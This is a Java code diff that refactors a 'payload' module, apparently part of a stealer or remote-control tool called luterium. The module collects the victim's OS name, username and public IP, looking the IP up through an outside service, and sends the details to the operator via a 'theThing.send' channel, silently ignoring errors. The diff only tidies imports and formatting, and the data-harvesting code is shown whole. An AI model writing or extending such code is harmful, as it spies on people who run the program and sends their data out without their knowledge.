@@ -1,11 +1,12 @@
 package dev.peter.luterium.features;
 
-import dev.peter.luterium.Main;
 import dev.peter.luterium.payload.PayloadExecutor;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.URL;
+
+import static dev.peter.luterium.Main.theThing;
 
 /**
  * @author Peter
@@ -13,8 +14,6 @@ import java.net.URL;
  **/
 
 public class Info implements PayloadExecutor {
-    public static Main main = new Main();
-
     @Override
     public void execute() throws Exception {
         String osName = System.getProperty("os.name"); //Gets your OS's name.
@@ -27,8 +26,7 @@ public class Info implements PayloadExecutor {
                     whatismyip.openStream()));
             String ip = bufferedReader.readLine(); //Gets your IP.
 
-            main.theThing.send("``` NAME : " + pcUsername + "\n IP" + "   : " + ip + " \n OS   : " + osName + "```");
-        } catch (Exception ignore) {
-        }
+            theThing.send("``` NAME : " + pcUsername + "\n IP" + "   : " + ip + " \n OS   : " + osName + "```");
+        } catch (Exception ignore) {}
     }
 }
